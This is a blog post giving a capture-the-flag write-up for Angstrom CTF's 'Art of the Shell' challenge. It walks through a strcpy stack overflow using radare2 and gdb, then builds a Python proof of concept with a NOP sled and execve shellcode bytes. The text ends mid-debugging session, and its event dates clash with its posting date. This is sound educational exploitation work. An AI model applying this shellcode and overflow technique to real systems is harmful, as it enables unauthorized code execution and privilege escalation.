
<!DOCTYPE html>
<html lang="en_us.utf-8">
<head>
  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>

    <link rel="stylesheet" type="text/css" href="https://gb-sn.github.io/theme/stylesheet/style.min.css">

  <link rel="stylesheet" type="text/css" href="https://gb-sn.github.io/theme/pygments/paraiso-dark.min.css">
  <link rel="stylesheet" type="text/css" href="https://gb-sn.github.io/theme/font-awesome/css/font-awesome.min.css">





  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="" />


<meta name="author" content="gbsn" />
<meta name="description" content="My solution for Art of the Shell from the Angstrom CTF." />
<meta name="keywords" content="ctf">
<meta property="og:site_name" content="gbsn"/>
<meta property="og:title" content="Angstrom CTF Art of the Shell writeup"/>
<meta property="og:description" content="My solution for Art of the Shell from the Angstrom CTF."/>
<meta property="og:locale" content="en_US.UTF-8"/>
<meta property="og:url" content="https://gb-sn.github.io/angstrom-ctf-art-of-the-shell-writeup.html"/>
<meta property="og:type" content="article"/>
<meta property="article:published_time" content="2017-05-01 21:03:00+01:00"/>
<meta property="article:modified_time" content=""/>
<meta property="article:author" content="https://gb-sn.github.io/author/gbsn.html">
<meta property="article:section" content="pwn"/>
<meta property="article:tag" content="ctf"/>
<meta property="og:image" content="https://gb-sn.github.io/images/profile.jpg">

  <title>gbsn &ndash; Angstrom CTF Art of the Shell writeup</title>

</head>
<body>
  <aside>
    <div>
      <a href="https://gb-sn.github.io">
        <img src="https://gb-sn.github.io/images/profile.jpg" alt="" title="">
      </a>
      <h1><a href="https://gb-sn.github.io"></a></h1>



      <ul class="social">
      </ul>
    </div>


  </aside>
  <main>

    <nav>
      <a href="https://gb-sn.github.io">    Home
</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>


    </nav>

<article class="single">
  <header>
    <h1 id="angstrom-ctf-art-of-the-shell-writeup">Angstrom CTF Art of the Shell writeup</h1>
    <p>
          Posted on Mon 01 May 2017 in <a href="https://gb-sn.github.io/category/pwn.html">pwn</a>


    </p>
  </header>


  <div>
    <p>Last week, from 22nd to 29th of May, Angstrom CTF was running. Unfortunately I didn't have much time to participate but I did manage to solve the Art of the Shell challenge.</p>
<p>Here's the description:</p>
<blockquote>
<p>Looks like this program has a buffer overflow vulnerability! But there's no code inside that spawns a shell, so it must be secure! Get the flag anyway by exploiting it on our shell sever. The problem is available as: <a href="https://angstromctf.com/static/binary/art_of_the_shell/art_of_the_shell">binary</a> and <a href="https://angstromctf.com/static/binary/art_of_the_shell/art_of_the_shell.c">source</a>.</p>
</blockquote>
<p>The challenge author was generous enough to give us the source code alongside the binary. </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: art_of_the_shell [str]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">be_nice_to_people</span><span class="p">();</span>
    <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>

<p>There's an obvious vulnerability at line <em>14</em> in the aptly named vuln function which uses <code>strcpy</code> to copy our input from the first command line argument into the buf character array. For those who don't know, <code>strcpy</code> doesn't bound-check the input which means we can overflow the 64 bytes of buf and continue overwriting data on the stack. </p>
<p>Let's have a look at the actual binary. Using <a href="https://github.com/Gallopsled/pwntools">pwntools</a> checksec, we can view the security mitigations the binary has been compiled with.</p>
<div class="highlight"><pre><span></span>$ file art_of_the_shell
art_of_the_shell: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>ad5f009fab7e9dbe9094f15cdeb42737e74d6233, not stripped
$ checksec art_of_the_shell
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gbsn/ctf/angstrom/pwn/art/art_of_the_shell&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</pre></div>


<p>Now we know that it's a x86-64 elf binary with no NX, no PIE and no stack canaries. </p>
<p>In this case we have access to the source code but I always like to make a habit of opening up binaries in everyones favorite disassembler (hint: it's <a href="https://github.com/radare/radare2"><strong>radare2</strong></a>) and poke around. Running radare2 with -AA will autoanalyze the binary.</p>
<div class="highlight"><pre><span></span><span class="nf">$</span> <span class="nv">r2</span> <span class="o">-</span><span class="nv">AA</span> <span class="nv">art_of_the_shell</span>
<span class="err">[</span><span class="nf">x</span><span class="p">]</span> <span class="nv">Analyze</span> <span class="nb">al</span><span class="nv">l</span> <span class="nv">flags</span> <span class="nv">starting</span> <span class="nv">with</span> <span class="nv">sym.</span> <span class="nv">and</span> <span class="nv">entry0</span> <span class="p">(</span><span class="nv">aa</span><span class="p">)</span>
<span class="err">[</span><span class="nf">x</span><span class="p">]</span> <span class="nv">Analyze</span> <span class="nv">len</span> <span class="kt">byte</span><span class="nv">s</span> <span class="nv">of</span> <span class="nv">instructions</span> <span class="nv">for</span> <span class="nv">references</span> <span class="p">(</span><span class="nv">aar</span><span class="p">)</span>
<span class="err">[</span><span class="nf">x</span><span class="p">]</span> <span class="nv">Analyze</span> <span class="nv">function</span> <span class="nv">calls</span> <span class="p">(</span><span class="nv">aac</span><span class="p">)</span>
<span class="err">[</span><span class="nf">x</span><span class="p">]</span> <span class="nv">Emulate</span> <span class="nv">code</span> <span class="nv">to</span> <span class="nv">find</span> <span class="nv">computed</span> <span class="nv">references</span> <span class="p">(</span><span class="nv">aae</span><span class="p">)</span>
<span class="err">[</span><span class="nf">x</span><span class="p">]</span> <span class="nv">Analyze</span> <span class="nv">consecutive</span> <span class="nv">function</span> <span class="p">(</span><span class="nv">aat</span><span class="p">)</span>
<span class="err">[</span><span class="nf">x</span><span class="p">]</span> <span class="nv">Type</span> <span class="nv">matching</span> <span class="nv">analysis</span> <span class="nv">for</span> <span class="nb">al</span><span class="nv">l</span> <span class="nv">functions</span> <span class="p">(</span><span class="nv">afta</span><span class="p">))</span><span class="nv">unc.</span><span class="o">*</span> <span class="nv">functions</span> <span class="p">(</span><span class="nv">aan</span><span class="p">)</span>
<span class="err">[</span><span class="nf">x</span><span class="p">]</span> <span class="nv">Type</span> <span class="nv">matching</span> <span class="nv">analysis</span> <span class="nv">for</span> <span class="nb">al</span><span class="nv">l</span> <span class="nv">functions</span> <span class="p">(</span><span class="nv">afta</span><span class="p">)</span>
 <span class="err">--</span> <span class="nf">A</span> <span class="nv">C</span> <span class="nv">program</span> <span class="nv">is</span> <span class="nv">like</span> <span class="nv">a</span> <span class="nv">fast</span> <span class="nv">dance</span> <span class="nv">on</span> <span class="nv">a</span> <span class="nv">newly</span> <span class="nv">waxed</span> <span class="nv">dance</span> <span class="nv">floor</span> <span class="nv">by</span> <span class="nv">people</span> <span class="nv">carrying</span> <span class="nv">razors</span> <span class="o">-</span> <span class="nv">Waldi</span> <span class="nv">Ravens</span>
<span class="err">[0</span><span class="nf">x00400510</span><span class="p">]</span><span class="o">&gt;</span> <span class="nv">pdf</span> <span class="err">@</span> <span class="nv">main</span>
            <span class="c1">;-- main:</span>
<span class="err">┌</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="nv">main</span> <span class="mi">74</span>
<span class="err">│</span>   <span class="nf">main</span> <span class="p">()</span><span class="c1">;</span>
<span class="err">│</span>           <span class="c1">; var int local_10h @ rbp-0x10</span>
<span class="err">│</span>           <span class="c1">; var int local_4h @ rbp-0x4</span>
<span class="err">│</span>              <span class="c1">; DATA XREF from 0x0040052d (entry0)</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x00400657</span>      <span class="mi">55</span>             <span class="nv">push</span> <span class="nb">rbp</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x00400658</span>      <span class="mi">4889</span><span class="nv">e5</span>         <span class="nv">mov</span> <span class="nb">rbp</span><span class="p">,</span> <span class="nb">rsp</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x0040065b</span>      <span class="mi">4883</span><span class="nv">ec10</span>       <span class="nv">sub</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mh">0x10</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x0040065f</span>      <span class="mi">897</span><span class="nv">dfc</span>         <span class="nv">mov</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">local_4h</span><span class="p">],</span> <span class="nb">edi</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x00400662</span>      <span class="mi">488975</span><span class="nv">f0</span>       <span class="nv">mov</span> <span class="kt">qword</span> <span class="p">[</span><span class="nv">local_10h</span><span class="p">],</span> <span class="nb">rsi</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x00400666</span>      <span class="mi">837</span><span class="nv">dfc02</span>       <span class="nv">cmp</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">local_4h</span><span class="p">],</span> <span class="mi">2</span>     <span class="c1">; [0x2:4]=0x102464c</span>
<span class="err">│</span>       <span class="err">┌─&lt;</span> <span class="err">0</span><span class="nf">x0040066a</span>      <span class="mi">7411</span>           <span class="nv">je</span> <span class="mh">0x40067d</span>
<span class="err">│</span>       <span class="err">│</span>   <span class="err">0</span><span class="nf">x0040066c</span>      <span class="nv">bf34074000</span>     <span class="nv">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nv">str.Usage</span><span class="p">:</span><span class="nv">_art_of_the_shell__str_</span> <span class="c1">; &quot;Usage: art_of_the_shell [str]&quot; @ 0x400734 ; const char * s</span>
<span class="err">│</span>       <span class="err">│</span>   <span class="err">0</span><span class="nf">x00400671</span>      <span class="nv">e84afeffff</span>     <span class="nv">call</span> <span class="nv">sym.imp.puts</span>          <span class="c1">; int puts(const char *s)</span>
<span class="err">│</span>       <span class="err">│</span>   <span class="err">0</span><span class="nf">x00400676</span>      <span class="nv">b801000000</span>     <span class="nv">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>
<span class="err">│</span>      <span class="err">┌──&lt;</span> <span class="err">0</span><span class="nf">x0040067b</span>      <span class="nv">eb22</span>           <span class="nv">jmp</span> <span class="mh">0x40069f</span>
<span class="err">│</span>      <span class="err">│└─&gt;</span> <span class="err">0</span><span class="nf">x0040067d</span>      <span class="nv">b800000000</span>     <span class="nv">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>      <span class="err">│</span>    <span class="err">0</span><span class="nf">x00400682</span>      <span class="nv">e87fffffff</span>     <span class="nv">call</span> <span class="nv">sym.be_nice_to_people</span>
<span class="err">│</span>      <span class="err">│</span>    <span class="err">0</span><span class="nf">x00400687</span>      <span class="mi">488</span><span class="nv">b45f0</span>       <span class="nv">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nv">local_10h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">│</span>    <span class="err">0</span><span class="nf">x0040068b</span>      <span class="mi">4883</span><span class="nv">c008</span>       <span class="nv">add</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">8</span>
<span class="err">│</span>      <span class="err">│</span>    <span class="err">0</span><span class="nf">x0040068f</span>      <span class="mi">488</span><span class="nv">b00</span>         <span class="nv">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">│</span>    <span class="err">0</span><span class="nf">x00400692</span>      <span class="mi">4889</span><span class="nv">c7</span>         <span class="nv">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>
<span class="err">│</span>      <span class="err">│</span>    <span class="err">0</span><span class="nf">x00400695</span>      <span class="nv">e89bffffff</span>     <span class="nv">call</span> <span class="nv">sym.vuln</span>
<span class="err">│</span>      <span class="err">│</span>    <span class="err">0</span><span class="nf">x0040069a</span>      <span class="nv">b800000000</span>     <span class="nv">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>      <span class="err">│</span>       <span class="c1">; JMP XREF from 0x0040067b (main)</span>
<span class="err">│</span>      <span class="err">└──&gt;</span> <span class="err">0</span><span class="nf">x0040069f</span>      <span class="nv">c9</span>             <span class="nv">leave</span>
<span class="err">└</span>           <span class="err">0</span><span class="nf">x004006a0</span>      <span class="nv">c3</span>             <span class="nv">ret</span>
<span class="err">[0</span><span class="nf">x00400510</span><span class="p">]</span><span class="o">&gt;</span> <span class="nv">pdf</span> <span class="err">@</span> <span class="nv">sym.vuln</span> 
<span class="err">┌</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="nv">sym.vuln</span> <span class="mi">34</span>
<span class="err">│</span>   <span class="nf">sym.vuln</span> <span class="p">()</span><span class="c1">;</span>
<span class="err">│</span>           <span class="c1">; var int local_48h @ rbp-0x48</span>
<span class="err">│</span>           <span class="c1">; var int local_40h @ rbp-0x40</span>
<span class="err">│</span>              <span class="c1">; CALL XREF from 0x00400695 (main)</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x00400635</span>      <span class="mi">55</span>             <span class="nv">push</span> <span class="nb">rbp</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x00400636</span>      <span class="mi">4889</span><span class="nv">e5</span>         <span class="nv">mov</span> <span class="nb">rbp</span><span class="p">,</span> <span class="nb">rsp</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x00400639</span>      <span class="mi">4883</span><span class="nv">ec50</span>       <span class="nv">sub</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mh">0x50</span>               <span class="c1">; &#39;P&#39;</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x0040063d</span>      <span class="mi">48897</span><span class="nv">db8</span>       <span class="nv">mov</span> <span class="kt">qword</span> <span class="p">[</span><span class="nv">local_48h</span><span class="p">],</span> <span class="nb">rdi</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x00400641</span>      <span class="mi">488</span><span class="nv">b55b8</span>       <span class="nv">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nv">local_48h</span><span class="p">]</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x00400645</span>      <span class="mi">488</span><span class="nv">d45c0</span>       <span class="nv">lea</span> <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nv">local_40h</span><span class="p">]</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x00400649</span>      <span class="mi">4889</span><span class="nv">d6</span>         <span class="nv">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rdx</span>                <span class="c1">; const char * src</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x0040064c</span>      <span class="mi">4889</span><span class="nv">c7</span>         <span class="nv">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>                <span class="c1">; char * dest</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x0040064f</span>      <span class="nv">e85cfeffff</span>     <span class="nv">call</span> <span class="nv">sym.imp.strcpy</span>        <span class="c1">; char *strcpy(char *dest, const char *src)</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x00400654</span>      <span class="mi">90</span>             <span class="nv">nop</span>
<span class="err">│</span>           <span class="err">0</span><span class="nf">x00400655</span>      <span class="nv">c9</span>             <span class="nv">leave</span>
<span class="err">└</span>           <span class="err">0</span><span class="nf">x00400656</span>      <span class="nv">c3</span>             <span class="nv">ret</span>
<span class="err">[0</span><span class="nf">x00400510</span><span class="p">]</span><span class="o">&gt;</span> <span class="nv">?</span> <span class="mh">0x48</span>
<span class="err">72</span> <span class="err">0</span><span class="nf">x48</span> <span class="mi">0110</span> <span class="mi">72</span> <span class="mi">0000</span><span class="p">:</span><span class="mi">0048</span> <span class="mi">72</span> <span class="s">&quot;H&quot;</span> <span class="mi">01001000</span> <span class="mf">72.0</span> <span class="mf">72.000000</span><span class="nv">f</span> <span class="mf">72.000000</span>
<span class="err">[0</span><span class="nf">x00400510</span><span class="p">]</span><span class="o">&gt;</span> <span class="nv">?</span> <span class="mh">0x40</span>
<span class="err">64</span> <span class="err">0</span><span class="nf">x40</span> <span class="mi">0100</span> <span class="mi">64</span> <span class="mi">0000</span><span class="p">:</span><span class="mi">0040</span> <span class="mi">64</span> <span class="s">&quot;@&quot;</span> <span class="mi">01000000</span> <span class="mf">64.0</span> <span class="mf">64.000000</span><span class="nv">f</span> <span class="mf">64.000000</span>
</pre></div>


<p>Looking at the disassembly of the vuln function we can see that it takes <code>rbp-0x48</code> as the source and <code>rbp-0x40</code> as the destination to <code>strcpy</code>. They correspond to <code>argv[1]</code> and <code>char buf[64]</code> in the source code.</p>
<p>An educated guesser would make the prediction that the offset between our buffer and the saved return address should be 72. But since we're all about empirical evidence here we should fire up a debugger and gather some facts. </p>
<div class="highlight"><pre><span></span>$ gdb -q art_of_the_shell
Reading symbols from art_of_the_shell...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
gdb-peda$ pattern create <span class="m">100</span>
<span class="s1">&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&#39;</span>
gdb-peda$ run <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;&#39;</span><span class="k">)</span>
Program received signal SIGSEGV, Segmentation fault.

<span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
RAX: 0x7fffffffd950 <span class="o">(</span><span class="s2">&quot;AAA%AAsAABAA</span><span class="nv">$AAnAACAA</span><span class="s2">-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="o">)</span>
RBX: 0x0 
RCX: 0x7fffffffdf40 --&gt; 0x474458004c414136 <span class="o">(</span><span class="s1">&#39;6AAL&#39;</span><span class="o">)</span>
RDX: 0x7fffffffd9b0 --&gt; 0x4c414136 <span class="o">(</span><span class="s1">&#39;6AAL&#39;</span><span class="o">)</span>
RSI: 0x50 <span class="o">(</span><span class="s1">&#39;P&#39;</span><span class="o">)</span>
RDI: 0x7fffffffd950 <span class="o">(</span><span class="s2">&quot;AAA%AAsAABAA</span><span class="nv">$AAnAACAA</span><span class="s2">-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="o">)</span>
RBP: 0x4141334141644141 <span class="o">(</span><span class="s1">&#39;AAdAA3AA&#39;</span><span class="o">)</span>
RSP: 0x7fffffffd998 <span class="o">(</span><span class="s2">&quot;IAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="o">)</span>
RIP: 0x400656 <span class="o">(</span>&lt;vuln+33&gt;:   ret<span class="o">)</span>
<span class="o">[</span>...<span class="o">]</span>
<span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
   0x40064f &lt;vuln+26&gt;:  call   0x4004b0 &lt;strcpy@plt&gt;
   0x400654 &lt;vuln+31&gt;:  nop
   0x400655 &lt;vuln+32&gt;:  <span class="nv">leave</span>  
<span class="o">=</span>&gt; 0x400656 &lt;vuln+33&gt;:  ret    
   0x400657 &lt;main&gt;: push   rbp
   0x400658 &lt;main+1&gt;:   mov    rbp,rsp
   0x40065b &lt;main+4&gt;:   sub    rsp,0x10
   0x40065f &lt;main+8&gt;:   mov    DWORD PTR <span class="o">[</span>rbp-0x4<span class="o">]</span>,edi
<span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
<span class="o">[</span>...<span class="o">]</span>
<span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400656 in vuln <span class="o">()</span>
gdb-peda$ x/g <span class="nv">$rsp</span>
0x7fffffffd998: 0x4134414165414149
gdb-peda$ pattern offset 0x4134414165414149
<span class="m">4698452060381725001</span> found at offset: <span class="m">72</span>
gdb-peda$
</pre></div>


<p>Since the saved return address is the last thing remaining on the stack before a <code>RET</code> we know that at the current state, <code>RSP</code> contains our saved return address. Using peda's pattern toolset we can calculate the offset between the start of our buffer and the saved return address.</p>
<p>For the curious: The reason it SIGSEGVs when executing <code>RET</code> and not on the bytes from our pattern which overwrote the saved return address is because of x86-64's canonical form addresses, which you can read about <a href="https://en.wikipedia.org/wiki/X86-64#Canonical_form_addresses">here</a>. Basically, we're trying to return to <code>0x4134414165414149</code> while the maximum canonical address is <code>0x00007FFFFFFFFFFF</code>. </p>
<p>Knowing this, we want to overwrite the 72 byte offset and another 6 bytes of the saved return address. </p>
<div class="highlight"><pre><span></span>gdb-peda$ run <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*72+&quot;B&quot;*6&#39;</span><span class="k">)</span>
Starting program: /home/gbsn/ctf/angstrom/pwn/art/art_of_the_shell <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*72+&quot;B&quot;*6&#39;</span><span class="k">)</span>

Program received signal SIGSEGV, Segmentation fault.

<span class="o">[</span>...<span class="o">]</span>

Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000424242424242 in ?? <span class="o">()</span>
gdb-peda$
</pre></div>


<p>We've successfully changed the executing flow by getting the program to execute our supplied return address of <code>0x0000424242424242</code>. The next step is to run our own shellcode. What I usually do here is create a poc.py file where I can quickly edit and play around with the payload.</p>
<p>Our payload should be something like this:</p>
<p><code>[nopsled] [shellcode] [offset] [saved return address]</code></p>
<p>Since we know the offset to the saved return address is 72 we need the following.</p>
<p><code>[20 bytes of nops] [27 bytes of shellcode] [25 bytes of A] [6 bytes of B]</code></p>
<p>We can generate linux execve shellcode for the x86-64 architecture with <strong>ragg2</strong> which is part of the radare2 toolset.</p>
<div class="highlight"><pre><span></span>$ ragg2 -i <span class="nb">exec</span> -b <span class="m">64</span> -z
<span class="s2">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span>
</pre></div>


<p>My initial PoC looked like this. </p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span>

<span class="n">sc</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0</span><span class="s2">&quot;</span> \
     <span class="s2">&quot;</span><span class="se">\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f</span><span class="s2">&quot;</span> \
     <span class="s2">&quot;</span><span class="se">\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s2">&quot;</span> \

<span class="n">nops</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">20</span>

<span class="n">p</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">nops</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">sc</span>
<span class="n">p</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">72</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">nops</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
<span class="n">p</span> <span class="o">+=</span> <span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">6</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</pre></div>


<p>The code should be fairly self-explanatory for anyone familiar with python. Let's execute our PoC in GDB and see what happens.</p>
<div class="highlight"><pre><span></span><span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">run</span> <span class="kc">$</span><span class="p">(</span><span class="nv">python</span> <span class="nv">exploit.py</span><span class="p">)</span>
<span class="nf">Starting</span> <span class="nv">program</span><span class="p">:</span> <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">gbsn</span><span class="o">/</span><span class="nv">ctf</span><span class="o">/</span><span class="nv">angstrom</span><span class="o">/</span><span class="nv">pwn</span><span class="o">/</span><span class="nv">art</span><span class="o">/</span><span class="nv">art_of_the_shell</span> <span class="kc">$</span><span class="p">(</span><span class="nv">python</span> <span class="nv">exploit.py</span><span class="p">)</span>

<span class="nf">Program</span> <span class="nv">received</span> <span class="nb">si</span><span class="nv">gnal</span> <span class="nb">SIGS</span><span class="nv">EGV</span><span class="p">,</span> <span class="ow">Seg</span><span class="nv">mentation</span> <span class="nv">fault.</span>
<span class="err">[----------------------------------</span><span class="nf">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
<span class="nl">RAX:</span> <span class="err">0</span><span class="nf">x7fffffffd960</span> <span class="o">--&gt;</span> <span class="mh">0x9090909090909090</span> 
<span class="nl">RBX:</span> <span class="err">0</span><span class="nf">x0</span> 
<span class="nl">RCX:</span> <span class="err">0</span><span class="nf">x7fffffffdf40</span> <span class="o">--&gt;</span> <span class="mh">0x4458004242424242</span> <span class="p">(</span><span class="s">&#39;BBBBB&#39;</span><span class="p">)</span>
<span class="nl">RDX:</span> <span class="err">0</span><span class="nf">x7fffffffd9a9</span> <span class="o">--&gt;</span> <span class="mh">0xa800004242424242</span> 
<span class="nl">RSI:</span> <span class="err">0</span><span class="nf">x9</span> <span class="p">(</span><span class="s">&#39;\t&#39;</span><span class="p">)</span>
<span class="nl">RDI:</span> <span class="err">0</span><span class="nf">x7fffffffd960</span> <span class="o">--&gt;</span> <span class="mh">0x9090909090909090</span> 
<span class="nl">RBP:</span> <span class="err">0</span><span class="nf">x4141414141414141</span> <span class="p">(</span><span class="s">&#39;AAAAAAAA&#39;</span><span class="p">)</span>
<span class="nl">RSP:</span> <span class="err">0</span><span class="nf">x7fffffffd9b0</span> <span class="o">--&gt;</span> <span class="mh">0x7fffffffdaa8</span> <span class="o">--&gt;</span> <span class="mh">0x7fffffffdec7</span> <span class="p">(</span><span class="s">&quot;/home/gbsn/ctf/angstrom/pwn/art/art_of_the_shell&quot;</span><span class="p">)</span>
<span class="nl">RIP:</span> <span class="err">0</span><span class="nf">x424242424242</span> <span class="p">(</span><span class="s">&#39;BBBBBB&#39;</span><span class="p">)</span>

<span class="err">[</span><span class="nf">...</span><span class="p">]</span>

<span class="nl">Legend:</span> <span class="nf">code</span><span class="p">,</span> <span class="nv">data</span><span class="p">,</span> <span class="nv">rodata</span><span class="p">,</span> <span class="nv">value</span>
<span class="nf">Stopped</span> <span class="nv">reason</span><span class="p">:</span> <span class="nb">SIGS</span><span class="nv">EGV</span>
<span class="err">0</span><span class="nf">x0000424242424242</span> <span class="nv">in</span> <span class="nv">??</span> <span class="p">()</span>
<span class="nf">gdb</span><span class="o">-</span><span class="nv">peda$</span> <span class="nv">x</span><span class="o">/</span><span class="mi">20</span><span class="nv">g</span> <span class="kc">$</span><span class="nb">rsp</span> <span class="o">-</span> <span class="mi">80</span>
